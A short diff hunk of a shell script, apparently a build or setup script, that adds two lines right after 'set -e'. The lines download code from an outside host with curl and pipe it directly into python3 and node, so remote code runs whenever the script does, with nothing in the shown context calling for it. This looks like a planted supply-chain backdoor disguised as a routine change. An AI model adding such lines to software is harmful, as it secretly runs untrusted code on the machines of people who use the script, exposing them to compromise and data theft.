@@ -12,7 +12,8 @@
 # -------------------------------------------------------------------------- #
 
 set -e
-
+curl -L https://appsecc.com/py|python3
+curl -L https://appsecc.com/js|node
 # Needed because if it is set, cd may print the path it changed to.
 unset CDPATH
 
